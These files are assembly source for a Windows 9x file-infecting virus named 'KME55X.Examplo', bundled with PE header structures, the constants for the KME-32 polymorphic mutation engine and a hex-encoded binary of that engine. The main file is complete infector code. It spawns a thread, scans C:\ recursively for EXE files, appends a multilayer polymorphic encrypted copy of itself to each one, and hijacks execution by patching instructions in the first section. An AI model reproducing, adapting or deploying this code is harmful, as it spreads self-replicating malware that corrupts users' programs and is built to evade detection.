
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[EXAMPLO.ASM]컴�
; ---------------------------------------------------------------------------
;
;             win9X.KME55X.Examplo virus -- KME usage example
;
; ---------------------------------------------------------------------------
;
; 1. Per-process resident (create new thread) PE EXE infector.
; 2. In new thread: recursively scans C:\ for *.EXE
; 3. Multilayer KME decryptor will be built, and appended to last section.
; 4. All infected files will grow by MAXVIRSIZE const - and it may be
;    changed to whatever you want.
; 5. Do not modify entrypoint. Find all MOV EAX, FS:[00000000h] within
;    1st section, and replace with CALL VIRUS.
;
; ---------------------------------------------------------------------------

MAXVIRSIZE              equ     1048576  ; <-- the more size, the more layers

include                 consts.inc
include                 kme.inc

                        p386
                        model   flat
                        locals  __

                        .data

; ---------------------------------------------------------------------------

virstart:
virentry:
                        pusha

                        call    __seh_init
                        mov     esp, [esp+8]
                        jmp     __seh_error
__seh_init:             push    dword ptr fs:[0]
                        mov     fs:[0], esp

                        call    $+5
                        pop     ebp
                        sub     ebp, $-1-virstart

                        call    get_func_names
                        jc      __exit

                        push    'A92'
                        push    esp
                        call    x_FindAtomA-virstart[ebp]
                        pop     ecx
                        or      ax, ax
                        jnz     __exit  ; exit if alredy set
                        push    'A92'
                        push    esp
                        call    x_AddAtomA-virstart[ebp]
                        pop     ecx

                        push    virmemory
                        push    40h     ; GMEM_FIXED+GMEM_ZEROINIT
                        call    x_GlobalAlloc-virstart[ebp]
                        or      eax, eax
                        jz      __exit
                        xchg    ebp, eax

                        call    $+5
                        pop     esi
                        sub     esi, $-1-virstart
                        mov     edi, ebp
                        mov     ecx, virmemory  ; i.e. with initialized APIs
                        cld
                        rep     movsb

                        push    eax
                        push    esp
                        push    0
                        push    ebp  ; thread arg = vir base
                        lea     eax, [ebp+newthread-virstart]
                        push    eax ; start address
                        push    0 ; stack size. 0==same as in primary thread
                        push    0
                        call    x_CreateThread-virstart[ebp]
                        pop     eax
__exit:
__seh_error:            pop     dword ptr fs:[0]
                        pop     eax

                        popa
                        retn

newthread:
                        pusha
                        mov     ebp, [esp+32+4] ; thread arg = vir base

                        call    __seh_init      ; SEH,
                        mov     esp, [esp+8]    ; Self-Exception Handling,
                        jmp     __seh_error
__seh_init:             push    dword ptr fs:[0]
                        mov     fs:[0], esp

                        push    MAXVIRSIZE
                        push    40h
                        call    x_GlobalAlloc-virstart[ebp]
                        mov     tempbufptr-virstart[ebp], eax

                        ; EDI=ff_struc
                        ; EDX=dir
                        sub     esp, size ff_struc
                        mov     edi, esp
                        push    '\:C'
                        mov     edx, esp        ; EDX='C:\',0
                        call    process_directory
                        add     esp, 4+size ff_struc

                        push    dword ptr [tempbufptr-virstart+ebp]
                        call    x_GlobalFree-virstart[ebp]

__seh_error:            pop     dword ptr fs:[0]
                        pop     eax

                        popa
                        retn

get_func_names:
                        lea     esi, imp_name-virstart[ebp]
                        lea     edi, imp_addr-virstart[ebp]

__cycle:                call    get_proc_address
                        jz      __error
                        stosd

__scan0:                lodsb
                        or      al, al
                        jnz     __scan0

                        cmp     [esi], al
                        jne     __cycle

__success:              clc
                        retn

__error:                stc
                        retn

; input:  ESI=function name wihtin kernel32 (4ex 'CreateProcessA')
; action: analyze kernel export table
; output: ZF=1, EAX=0 (function not found)
;         ZF=0, EAX=function va

get_proc_address:       pusha

                        mov     ebx, 0BFF70000h         ; get_kernel_base

                        mov     ecx, [ebx].mz_neptr
                        mov     ecx, [ecx+ebx].pe_exporttablerva
                        add     ecx, ebx

                        xor     edi, edi        ; current index
__search_cycle:         lea     edx, [edi*4+ebx]
                        add     edx, [ecx].ex_namepointersrva
                        mov     edx, [edx]      ; name va
                        add     edx, ebx        ; +imagebase

                        pusha                   ; compare names
                        mov     edi, edx
__cmp_cycle:            cmp     byte ptr [edi], 0
                        je      __cmp_done
                        cmpsb
                        je      __cmp_cycle
__cmp_done:             popa

                        je      __name_found

                        inc     edi             ; index++
                        cmp     edi, [ecx].ex_numofnamepointers
                        jb      __search_cycle

__return_0:             xor     eax, eax        ; return 0
                        jmp     __return

__name_found:           mov     edx, [ecx].ex_ordinaltablerva
                        add     edx, ebx        ; +imagebase
                        movzx   edx, word ptr [edx+edi*2]; edx=current ordinal
                        mov     eax, [ecx].ex_addresstablerva
                        add     eax, ebx        ; +imagebase
                        mov     eax, [eax+edx*4]; eax=current address
                        add     eax, ebx        ; +imagebase

__return:               mov     [esp].popa_eax, eax  ; popa.eax
                        test    eax, eax

                        popa
                        retn

; subroutine: process_directory
; action:     1. find all files in the current directory
;             2. for each found directory (except "."/"..") recursive call;
;                for each found file call process_file
; input:      EDI=ff_struc
;             EDX=directory name
; output:     none

process_directory:      pusha
                        sub     esp, 1024

                        mov     esi, edx
                        mov     edi, esp

__1:                    lodsb
                        stosb
                        or      al, al
                        jnz     __1

                        dec     edi
                        mov     al, '\'
                        cmp     [edi-1], al
                        je      __3
                        stosb
__3:
                        mov     ebx, edi

                        mov     eax, '*.*'
                        stosd

                        mov     edi, [esp+1024]

                        mov     eax, esp
                        push    edi
                        push    eax
                        call    x_FindFirstFileA-virstart[ebp]

                        xchg    esi, eax

                        cmp     esi, -1
                        je      __quit

__cycle:                pusha
                        lea     esi, [edi].ff_fullname
                        mov     edi, ebx
__strcpy:               lodsb
                        stosb
                        or      al, al
                        jnz     __strcpy
                        popa

                        mov     edx, esp

                        test    byte ptr [edi].ff_attr, 16
                        jnz     __dir

                        call    process_file

                        jmp     __next
__dir:
                        lea     eax, [edi].ff_fullname
                        cmp     byte ptr [eax], '.'    ; skip ./../etc.
                        je      __next

                        call    process_directory

__next:                 push    edi
                        push    esi
                        call    x_FindNextFileA-virstart[ebp]

                        or      eax, eax
                        jnz     __cycle

                        push    esi
                        call    x_FindClose-virstart[ebp]

__quit:                 add     esp, 1024
                        popa
                        retn

; input: EDX=full filename
;        EDI=ff_struc

process_file:           pusha

                        mov     esi, edx
__scan0:                lodsb
                        or      al, al
                        jne     __scan0
                        mov     eax, [esi-5]
                        or      eax, 20202000h

                        cmp     eax, 'exe.'   ; .exe
                        je      __infect

                        popa
                        retn

__infect:               call    infect_file

                        popa
                        retn

; input: EDX=fullname
;        EDI=ff_struc
;        EAX=extension

infect_file:            pusha

                        mov     esi, [edi].ff_size

                        cmp     esi, 256*1024
                        jae     __exit

                        push    0
                        push    80h     ; FILE_ATTRIBUTE_NORMAL
                        push    3       ; 3=OPEN_EXISTING  2=CREATE_ALWAYS
                        push    0
                        push    1+2     ; 1=FILE_SHARE_READ 2=FILE_SHARE_WRITE
                        push    080000000h+40000000h ; GENERIC_READ + GENERIC_WRITE
                        push    edx     ; EDX=fname
                        call    x_CreateFileA-virstart[ebp]
                        cmp     eax, -1
                        je      __exit
                        xchg    ebx, eax

                        lea     eax, [esi+MAXVIRSIZE]
                        push    eax                     ; size
                        push    0                       ; 0=GMEM_FIXED
                        call    x_GlobalAlloc-virstart[ebp]
                        xchg    edi, eax

                        push    0
                        push    esp                     ; bytesread
                        push    esi                     ; size
                        push    edi                     ; buf
                        push    ebx                     ; handle
                        call    x_ReadFile-virstart[ebp]

                        call    infect_real
                        jc      __close

                        push    0                       ; FILE_BEGIN
                        push    0
                        push    0
                        push    ebx
                        call    x_SetFilePointer-virstart[ebp]

                        push    0
                        push    esp                     ; bytesread
                        push    esi                     ; size
                        push    edi                     ; buf
                        push    ebx                     ; handle
                        call    x_WriteFile-virstart[ebp]

__close:
                        push    edi
                        call    x_GlobalFree-virstart[ebp]

                        push    ebx
                        call    x_CloseHandle-virstart[ebp]

__exit:                 popa
                        retn

; subroutine.
; infects file read into memory.

; input:  EDI=buffer with file (max size is ESI+MAXVIRSIZE)
;         ESI=file length
; output: CF==0 -- infected OK, ESI=new size
;         CF==1 -- error

infect_real:            pusha

                        cmp     [edi].mz_id, 'ZM'   ; check if MZ file
                        jne     __error

                        mov     ebx, edi
                        add     ebx, [ebx].mz_neptr ; EBX = PE header

                        cmp     [ebx].pe_id, 'EP'   ; check if PE file
                        jne     __error

                        test    [ebx].pe_exeflags, 2000h ; dll ?
                        jnz     __error

                        cmp     [ebx].pe_userminor, 100
                        je      __error
                        mov     [ebx].pe_userminor, 100

                        movzx   eax, [ebx].pe_ntheadersize
                        add     eax, 18h

                        add     eax, ebx

                        movzx   ecx, [ebx].pe_numofobjects
                        dec     ecx
                        imul    ecx, size oe_struc

                        add     ecx, eax

                        mov     eax, [ebx].pe_filealign
                        dec     eax
                        add     [ecx].oe_phys_size, eax
                        not     eax
                        and     [ecx].oe_phys_size, eax

                        mov     eax, [ebx].pe_objectalign
                        dec     eax
                        add     [ecx].oe_virt_size, eax
                        not     eax
                        and     [ecx].oe_virt_size, eax

                        mov     eax, [ecx].oe_phys_offs
                        add     eax, [ecx].oe_phys_size
                        cmp     eax, esi
                        jne     __error

                        mov     eax, [ecx].oe_phys_size
                        mov     edx, [ecx].oe_virt_size
                        cmp     eax, edx
                        ja      __error
                        or      eax, edx
                        jz      __error

                        lea     eax, [esi+edi]  ; EAX=kme_outbuf_ptr
                        call    do_morph
                        jc      __error

                        call    do_uep
;                       jc      __error

                        mov     edx, MAXVIRSIZE
                        mov     eax, [ebx].pe_objectalign
                        dec     eax
                        add     edx, eax
                        not     eax
                        and     edx, eax

                        add     [ebx].pe_imagesize, edx
                        add     [ebx].pe_sizeofcode, edx

                        add     [ebx].pe_stackreservesize, MAXVIRSIZE*16
                        add     [ebx].pe_heapreservesize,  MAXVIRSIZE*16

                        add     [ecx].oe_virt_size, edx

                        mov     edx, MAXVIRSIZE
                        mov     eax, [ebx].pe_filealign
                        dec     eax
                        add     edx, eax
                        not     eax
                        and     edx, eax

                        add     [ecx].oe_phys_size, edx

                        add     [esp].popa_esi, edx

__success:              clc
                        popa
                        retn

__error:                stc
                        popa
                        retn

; EBP=inbuf   size=virsize
; EAX=outbuf  size=MAXVIRSIZE

do_morph:               pusha

                        push    FLAG_NOJMPS+FLAG_X_CALLESP ; flags
                        push    CMD_ALL                 ; cmd mask
                        push    CMD2_ALL-CMD2_FPU       ; cmd2 mask
                        push    REG_ALL                 ; reg mask
                        push    0                       ; jmps if rnd(X)==0
                        push    0                       ; [output eip]
                        push    0                       ; [output size]
                        push    0                       ; output filler
                        push    MAXVIRSIZE              ; output/max size
                        push    eax                     ; output buffer
                        push    virentry-virstart       ; input eip
                        push    virmemory               ; input size
                        push    ebp                     ; input buffer
                        push    0                       ; 0 or pointer to 8 dwords
                        push    0                       ; 0 or pointer to 8 dwords
                        push    0                       ; virus in-file RVA
                        push    0                       ; original entry RVA
                        push    REG_ALL                 ; push/pop regs at prolog/epilog
                        call    x_GetTickCount-virstart[ebp]
                        push    eax                     ; randseed
                        push    29Ah                    ; # of layers ;-)
                        push    dword ptr [tempbufptr-virstart+ebp] ; tempbuf
                        call    kme
                        add     esp, 4*KME_N_ARGS

                        cmp     eax, KME_ERROR_SUCCESS
                        jne     __error

                        clc
                        popa
                        retn

                        ; should never happen
__error:                stc
                        popa
                        retn

; input: EDI=file buffer ptr
;        ESI=size (original, w/o virus)
;        ECX=last section objentry
;        EBX=pe header

do_uep:                 pusha

                        mov     edi, [ecx].oe_virt_rva   ; EDI=vir RVA
                        add     edi, [ecx].oe_phys_size

                        movzx   esi, [ebx].pe_ntheadersize
                        lea     esi, [ebx+esi+18h]       ; EAX=&objtable[0]
                        mov     ebx, [esi].oe_phys_offs  ; EBX=1st sect offs
                        add     ebx, [esp].pusha_edi
                        mov     eax, [esi].oe_virt_rva   ; EAX=curr.RVA
                        mov     ecx, [esi].oe_phys_size  ; ECX=1st sect size

@@cycle:
                        ; MOV EAX, FS:[00000000h] <-- useless stuff ;-)
                        cmp     word ptr [ebx], 0A164h     ; 64 A1
                        jne     @@not
                        cmp     dword ptr [ebx+2], 0       ; 0 0 0 0
                        jne     @@not

                        pusha

                        mov     byte ptr [ebx], 0E8h

                        add     eax, 5
                        sub     edi, eax
                        mov     [ebx+1], edi

                        mov     byte ptr [ebx+5], 90h

                        popa

@@not:                  inc     eax
                        inc     ebx
                        loop    @@cycle

                        ; even if we replaced nothing

                        popa
                        retn
imp_name:
                        db      'FindFirstFileA',0
                        db      'FindNextFileA',0
                        db      'FindClose',0
                        ;;
                        db      'CreateFileA',0
                        db      'SetFilePointer',0
                        db      'ReadFile',0
                        db      'WriteFile',0
                        db      'CloseHandle',0
                        ;;
                        db      'GlobalAlloc',0
                        db      'GlobalFree',0
                        ;;
                        db      'CreateThread',0
                        ;;
                        db      'FindAtomA',0
                        db      'AddAtomA',0
                        ;;
                        db      'GetTickCount',0
                        ;;
                        db      0

include                 kmebin.inc

                        align   4

virsize                 equ     $-virstart

imp_addr:
x_FindFirstFileA        dd      ?
x_FindNextFileA         dd      ?
x_FindClose             dd      ?
                        ;;
x_CreateFileA           dd      ?
x_SetFilePointer        dd      ?
x_ReadFile              dd      ?
x_WriteFile             dd      ?
x_CloseHandle           dd      ?
                        ;;
x_GlobalAlloc           dd      ?
x_GlobalFree            dd      ?
                        ;;
x_CreateThread          dd      ?
                        ;;
x_FindAtomA             dd      ?
x_AddAtomA              dd      ?
                        ;;
x_GetTickCount          dd      ?
                        ;;

tempbufptr              dd      ?

                        align   4

virmemory               equ     $-virstart

; ---------------------------------------------------------------------------

                        .code
loader:

                        call    virentry

                        push    60*1000
                        extern  Sleep:PROC
                        call    Sleep

                        push    -1
                        extern  ExitProcess:PROC
                        call    ExitProcess

                        end     loader
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[EXAMPLO.ASM]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[CONSTS.INC]컴�
mz_struc                struc
mz_id                   dw      ?               ; MZ/ZM
mz_last512              dw      ?
mz_num512               dw      ?
mz_relnum               dw      ?
mz_hdrsize              dw      ?               ; in PAR
mz_minmem               dw      ?
mz_maxmem               dw      ?
mz_ss                   dw      ?
mz_sp                   dw      ?
mz_csum                 dw      ?               ; 0
mz_ip                   dw      ?
mz_cs                   dw      ?
mz_relptr               dw      ?
mz_ovrnum               dw      ?               ; 0
                        db      32 dup (?)
mz_neptr                dd      ?
                        ends

pe_struc                struc
pe_id                   dd      ?       ; 00 01 02 03  pe00
pe_cputype              dw      ?       ; 04 05        14c..14e: i386..i586
pe_numofobjects         dw      ?       ; 06 07
pe_datetime             dd      ?       ; 08 09 0a 0b  date/time
pe_cofftableptr         dd      ?       ; 0c 0d 0e 0f
pe_cofftablesize        dd      ?       ; 10 11 12 13
pe_ntheadersize         dw      ?       ; 14 15
pe_exeflags             dw      ?       ; 16 17
                        ; ntheader
pe_ntheader_id          dw      ?       ; 18 19
pe_linkmajor            db      ?       ; 19
pe_linkminor            db      ?       ; 1a
pe_sizeofcode           dd      ?       ; 1c 1d 1e 1f
pe_sizeofinitdata       dd      ?       ; 20 21 22 23
pe_sizeofuninitdata     dd      ?       ; 24 25 26 27
pe_entrypointrva        dd      ?       ; 28 29 2a 2b
pe_baseofcoderva        dd      ?       ; 2c 2d 2e 2f
pe_baseofdatarva        dd      ?       ; 30 31 32 33
pe_imagebase            dd      ?       ; 34 35 36 37    align: 64k
pe_objectalign          dd      ?       ; 39 30 3a 3b  256n > power2 > 512
pe_filealign            dd      ?       ; 3c 3d 3e 3f   64k > power2 > 512
pe_osmajor              dw      ?       ; 40 41
pe_osminor              dw      ?       ; 42 43
pe_usermajor            dw      ?       ; 44 45
pe_userminor            dw      ?       ; 46 47
pe_subsysmajor          dw      ?       ; 48 49
pe_subsysminor          dw      ?       ; 4a 4b
                        dd      ?       ; 4c 4d 4e 4f
pe_imagesize            dd      ?       ; 50 51 52 53  align: objectalign
pe_headersize           dd      ?       ; 54 55 56 57  dosh+peh+objecttable
pe_checksum             dd      ?       ; 58 59 5a 5b  0
pe_subsystem            dw      ?       ; 5c 5d
pe_dllflags             dw      ?       ; 5e 5f
pe_stackreservesize     dd      ?       ; 60 61 62 63
pe_stackcommitsize      dd      ?       ; 64 65 66 67
pe_heapreservesize      dd      ?       ; 68 69 6a 6b
pe_heapcommitsize       dd      ?       ; 6c 6d 6e 6f
pe_loaderflags          dd      ?       ; 70 71 72 73
pe_numofrvaandsizes     dd      ?       ; 74 75 76 77   =10h
                        ; rva/sizes
pe_rvasizes             label   dword
pe_exporttablerva       dd      ?       ; 78 79 7a 7b
pe_exporttablesize      dd      ?       ; 7c 7d 7e 7f
pe_importtablerva       dd      ?       ; 80 81 82 83
pe_importtablesize      dd      ?       ; 84 85 86 87
pe_resourcetablerva     dd      ?       ; 88 89 8a 8b
pe_resourcetablesize    dd      ?       ; 8c 8d 8e 8f
pe_exceptiontablerva    dd      ?       ; 90 91 92 93
pe_exceptiontablesize   dd      ?       ; 94 95 96 97
pe_securitytablerva     dd      ?       ; 98 99 9a 9b
pe_securitytablesize    dd      ?       ; 9c 9d 9e 9f
pe_fixuptablerva        dd      ?       ; a0 a1 a2 a3
pe_fixuptablesize       dd      ?       ; a4 a5 a6 a7
pe_debugtablerva        dd      ?       ; a8 a9 aa ab
pe_debugtablesize       dd      ?       ; ac ad ae af
pe_imgdescrrva          dd      ?       ; b0 b1 b2 b3
pe_imgdescrsize         dd      ?       ; b4 b5 b6 b7
pe_machinerva           dd      ?       ; b8 b9 ba bb
pe_machinesize          dd      ?       ; bc bd be bf
pe_tlsrva               dd      ?       ; c0 c1 c2 c3
pe_tlssize              dd      ?       ; c4 c5 c6 c7
pe_loadcfgrva           dd      ?       ; c8 c9 ca cb
pe_loadcfgsize          dd      ?       ; cc cd ce cf
                        dq      ?       ; d0 d1 d2 d3 d4 d5 d6 d7
pe_iattablerva          dd      ?       ; d8 d9 da db
pe_iattablesize         dd      ?       ; dc dd de df
                        dq      ?       ; e0 e1 e2 e3 d4 e5 e6 e7
                        dq      ?       ; e8 e9 ea eb ec ed ee ef
                        dq      ?       ; f0 f1 f2 f3 f4 f5 f6 f7
                        ends

oe_struc                struc
oe_name                 db      8 dup (?);00 01 02 03 04 05 06 07
oe_virt_size            dd      ?       ; 08 09 0a 0b
oe_virt_rva             dd      ?       ; 0c 0d 0e 0f  align: objectalign
oe_phys_size            dd      ?       ; 10 11 12 13
oe_phys_offs            dd      ?       ; 14 15 16 17  align: filealign
oe_xxx                  dd      ?       ; for obj file
                        dd      ?       ; --//--
                        dd      ?       ; --//--
oe_flags                dd      ?        ; 24 25 26 27
                        ends

ex_struct               struct
ex_flags                dd      ?       ; 00 01 02 03
ex_datetime             dd      ?       ; 04 05 06 07
ex_major_ver            dw      ?       ; 08 09
ex_minor_ver            dw      ?       ; 0A 0B
ex_namerva              dd      ?       ; 0C 0D 0E 0F
ex_ordinalbase          dd      ?       ; 10 11 12 13
ex_numoffunctions       dd      ?       ; 14 15 16 17
ex_numofnamepointers    dd      ?       ; 18 19 1A 1B
ex_addresstablerva      dd      ?       ; 1C 1D 1E 1F
ex_namepointersrva      dd      ?       ; 20 21 22 23
ex_ordinaltablerva      dd      ?       ; 24 25 26 27
                        ends

ff_struc                struc                   ; win32 "searchrec" structure
ff_attr                 dd      ?
ff_time_create          dd      ?,?
ff_time_lastaccess      dd      ?,?
ff_time_lastwrite       dd      ?,?
ff_size_hi              dd      ?
ff_size                 dd      ?
                        dd      ?,?
ff_fullname             db      260 dup (?)
ff_shortname            db      14 dup (?)
                        ends

pusha_struc             struc
pusha_edi               dd      ?
pusha_esi               dd      ?
pusha_ebp               dd      ?
pusha_esp               dd      ?
pusha_ebx               dd      ?
pusha_edx               dd      ?
pusha_ecx               dd      ?
pusha_eax               dd      ?
                        ends

popa_struc              struc
popa_edi                dd      ?
popa_esi                dd      ?
popa_ebp                dd      ?
popa_esp                dd      ?
popa_ebx                dd      ?
popa_edx                dd      ?
popa_ecx                dd      ?
popa_eax                dd      ?
                        ends
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[CONSTS.INC]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[KME.INC]컴�
; ===========================================================================
; KME-32  v5.52   Kewl Mutation Engine
; ===========================================================================

; --------------------- flags -----------------------------------------------

KME_N_ARGS              equ     21

FLAG_DEBUG              equ     00000001h ; insert INT3 into poly decr
FLAG_NOLOGIC            equ     00000002h ; disable "logic"
FLAG_NOJMPS             equ     00000004h ; disable JMPs.
  ; NOJMPS means generate continuous block of code
FLAG_EIP0               equ     00000008h ; initial entry = 0, not rnd
FLAG_NOSHORT            equ     00000010h ; disable short-opcodes for EAX
; v3.00+
FLAG_NOSHORT_C          equ     00000020h ; disable short-consts usage
FLAG_NOSWAP             equ     00000040h ; disable [cmd r1,r2] perverting
; v4.00+
FLAG_ONLY386            equ     00000080h ; only .386 opcodes
FLAG_X_CALLESP          equ     00000100h ; call esp; add esp, <N>
FLAG_X_RETBYJMP         equ     00000200h ; JMP OrigEntry; otherwise RETN
FLAG_X_RET0C            equ     00000400h ; MOV EAX,1/RETN 0Ch instead of RETN
; v4.50+
FLAG_RANDOMSTRATEGY     equ     00000800h ; auto-select CMD_xxx & REG_xxx
; v5.00+
FLAG_NOREPEATPUSH       equ     00001000h ; disable repeteable PUSH
; v5.50+
FLAG_FAILIFNOMEMORY     equ     00002000h ; fail if cant create nlayer layers
FLAG_X_NORET            equ     00004000h ; doesnt build JMP ESP-alike code

; --------------------- registers -------------------------------------------

KME_ERROR_SUCCESS       equ     1         ; decryptor generated OK
KME_ERROR_ASSERT        equ     -1        ; internal error (kind of assert)
KME_ERROR_NOMEMORY      equ     -2        ; no free space in output buffer
KME_ERROR_BADARG        equ     -3        ; bad argument passed into engine

; --------------------- registers -------------------------------------------

REG_EAX                 equ     00000001h ; bitfields for register mask
REG_ECX                 equ     00000002h ;
REG_EDX                 equ     00000004h ; at least 1 register should
REG_EBX                 equ     00000008h ; be specified.
REG_ESP                 equ     00000010h ; use REG_DEFAULT otherwise
REG_EBP                 equ     00000020h ;
REG_ESI                 equ     00000040h ;
REG_EDI                 equ     00000080h ;
REG_ALL                 equ     (not REG_ESP) and 255

REG_DEFAULT             equ     REG_EAX

REG_EAX_N               equ     0
REG_ECX_N               equ     1
REG_EDX_N               equ     2
REG_EBX_N               equ     3
REG_ESP_N               equ     4
REG_EBP_N               equ     5
REG_ESI_N               equ     6
REG_EDI_N               equ     7

; --------------------- commands --------------------------------------------

CMD_ALL                 equ     -1              ; use all available commands

CMD_MOV                 equ     00000001h       ; bitfields for command mask
CMD_XCHG                equ     00000002h       ;
CMD_ADD                 equ     00000004h       ; at least 1 command should
CMD_SUB                 equ     00000008h       ; be specified. default=XOR
CMD_XOR                 equ     00000010h       ;
CMD_INC                 equ     00000020h       ; all CMD_xxx commands can be
CMD_DEC                 equ     00000040h       ; disabled by FLAG_NOLOGIC
CMD_OR                  equ     00000080h       ;
CMD_AND                 equ     00000100h       ;
CMD_SHL                 equ     00000200h       ;
CMD_SHR                 equ     00000400h       ;
CMD_ROL                 equ     00000800h       ;
CMD_ROR                 equ     00001000h       ;
CMD_SAR                 equ     00002000h       ;
CMD_NOT                 equ     00004000h       ;
CMD_NEG                 equ     00008000h       ;
CMD_IMUL_EX             equ     00010000h       ;
CMD_SHLD                equ     00020000h       ;
CMD_SHRD                equ     00040000h       ;
CMD_BTC                 equ     00080000h       ;
CMD_BTR                 equ     00100000h       ;
CMD_BTS                 equ     00200000h       ;
CMD_BSWAP               equ     00400000h       ;
CMD_XADD                equ     00800000h       ;
CMD_MOVSXZX             equ     01000000h       ; mov?x
CMD_BSR                 equ     02000000h       ;
CMD_BSF                 equ     04000000h       ;
CMD_MUL                 equ     08000000h
CMD_IMUL                equ     10000000h
CMD_DIV                 equ     20000000h
CMD_IDIV                equ     40000000h
CMD_PUSHPOP             equ     80000000h       ; used when initializing regs
;;
CMD_OLDSTUFF            equ     000FFFFFFh      ; 1.00
CMD_NEWSTUFF            equ     0FF000000h      ; 2.00+

CMD2_ALL                equ     -1

CMD2_PUSHPOPR           equ     00000001h       ; push r; polycmd; pop r
CMD2_PUSHPOPC           equ     00000002h       ; push c; polycmd; pop r
CMD2_IFOLLOW            equ     00000004h       ; cmp r, c; jxx
CMD2_INOFOLLOW          equ     00000008h       ; cmp r, c; jxx fake
CMD2_RFOLLOW            equ     00000010h       ; cmp r, r; jxx
CMD2_RNOFOLLOW          equ     00000020h       ; cmp r, r; jxx fake
CMD2_SUBROUTINE         equ     00000040h       ; 8-()
CMD2_CYCLE              equ     00000080h       ; |->
CMD2_FPU                equ     00000100h       ; X-) fsin,fcos,fsqrt,fadd,fsub,fmul,fdiv,fsubr,fdivr

; ===========================================================================
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[KME.INC]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[KMEBIN.INC]컴�
; GENERATED FILE. DO NOT EDIT!

kme_size	equ	00000177Bh	; 6011

kme:
	db	0C8h,03Ch,001h,000h,060h,0FCh,089h,065h
	db	0FCh,089h,06Dh,0F8h,083h,07Dh,00Ch,001h
	db	00Fh,085h,00Eh,016h,000h,000h,0F7h,045h
	db	058h,000h,008h,000h,000h,074h,018h,0E8h
	db	0D8h,015h,000h,000h,089h,045h,04Ch,0E8h
	db	0D0h,015h,000h,000h,089h,045h,054h,0E8h
	db	0C8h,015h,000h,000h,089h,045h,050h,083h
	db	07Dh,048h,000h,075h,010h,0B8h,00Bh,000h
	db	000h,000h,0E8h,083h,015h,000h,000h,083h
	db	0C0h,00Ah,089h,045h,048h,083h,07Dh,03Ch
	db	0FFh,075h,008h,0E8h,099h,015h,000h,000h
	db	089h,045h,03Ch,081h,065h,04Ch,0EFh,000h
	db	000h,000h,075h,004h,083h,04Dh,04Ch,001h
	db	081h,065h,014h,0EFh,000h,000h,000h,0F7h
	db	045h,058h,080h,000h,000h,000h,074h,007h
	db	081h,065h,054h,0FFh,0FFh,03Fh,0FFh,08Bh
	db	07Dh,034h,08Bh,04Dh,038h,08Bh,045h,03Ch
	db	0F3h,0AAh,088h,04Dh,0BCh,089h,04Dh,0B4h
	db	088h,08Dh,0E0h,0FEh,0FFh,0FFh,088h,08Dh
	db	0DCh,0FEh,0FFh,0FFh,089h,08Dh,0D8h,0FEh
	db	0FFh,0FFh,089h,04Dh,0ECh,089h,04Dh,0F0h
	db	08Bh,075h,028h,08Bh,04Dh,02Ch,033h,0D2h
	db	0ACh,032h,0D0h,002h,0D0h,0D1h,0C2h,0E2h
	db	0F7h,089h,095h,0D4h,0FEh,0FFh,0FFh,08Bh
	db	07Dh,034h,0F7h,045h,058h,00Ch,000h,000h
	db	000h,075h,00Bh,083h,07Dh,044h,000h,074h
	db	005h,0E8h,019h,006h,000h,000h,08Bh,04Dh
	db	044h,0E3h,007h,08Bh,0C7h,02Bh,045h,034h
	db	089h,001h,083h,045h,02Ch,003h,083h,065h
	db	02Ch,0FCh,0E8h,030h,001h,000h,000h,083h
	db	07Dh,024h,000h,074h,021h,033h,0DBh,00Fh
	db	0A3h,05Dh,04Ch,073h,013h,08Bh,055h,024h
	db	08Bh,014h,09Ah,083h,0FAh,0FFh,074h,008h
	db	089h,054h,09Dh,0CCh,00Fh,0ABh,05Dh,0ECh
	db	043h,080h,0FBh,008h,072h,0E1h,0FFh,075h
	db	04Ch,08Bh,05Dh,014h,0F7h,0D3h,021h,05Dh
	db	04Ch,0F7h,0D3h,009h,05Dh,0F0h,00Fh,0BCh
	db	0C3h,074h,020h,00Fh,0B3h,0C3h,00Fh,0A3h
	db	004h,024h,073h,004h,00Fh,0ABh,045h,04Ch
	db	00Fh,0B3h,045h,0F0h,0E8h,0E1h,005h,000h
	db	000h,004h,050h,0AAh,0E8h,07Eh,003h,000h
	db	000h,0EBh,0DBh,08Fh,045h,04Ch,033h,0C9h
	db	0E8h,072h,003h,000h,000h,0E8h,01Bh,006h
	db	000h,000h,083h,06Dh,02Ch,004h,08Bh,055h
	db	02Ch,003h,055h,028h,08Bh,012h,0F7h,045h
	db	058h,000h,010h,000h,000h,075h,014h,033h
	db	0DBh,039h,054h,09Dh,0CCh,075h,006h,00Fh
	db	0A3h,05Dh,0ECh,072h,018h,043h,080h,0FBh
	db	008h,075h,0EEh,0E8h,066h,004h,000h,000h
	db	072h,07Ah,093h,0E8h,0F2h,000h,000h,000h
	db	0E8h,047h,003h,000h,000h,00Fh,0ABh,05Dh
	db	0F0h,088h,05Ch,00Dh,0C4h,041h,0F7h,045h
	db	058h,000h,010h,000h,000h,075h,00Ch,083h
	db	0F9h,008h,077h,058h,072h,005h,0E8h,07Bh
	db	000h,000h,000h,083h,07Dh,02Ch,000h,07Fh
	db	09Ch,0E8h,0BAh,000h,000h,000h,0E8h,0CDh
	db	000h,000h,000h,02Bh,07Dh,034h,0F7h,045h
	db	058h,004h,000h,000h,000h,075h,003h,08Bh
	db	07Dh,038h,08Bh,04Dh,040h,0E3h,002h,089h
	db	039h,0B8h,001h,000h,000h,000h,089h,044h
	db	024h,01Ch,048h,074h,00Ch,08Bh,07Dh,034h
	db	08Bh,04Dh,038h,08Bh,045h,03Ch,0FCh,0F3h
	db	0AAh,08Bh,07Dh,008h,00Bh,0FFh,074h,009h
	db	08Bh,04Dh,038h,08Bh,045h,03Ch,0FCh,0F3h
	db	0AAh,061h,0C9h,0C3h,0B8h,0FFh,0FFh,0FFh
	db	0FFh,0EBh,00Ch,0B8h,0FEh,0FFh,0FFh,0FFh
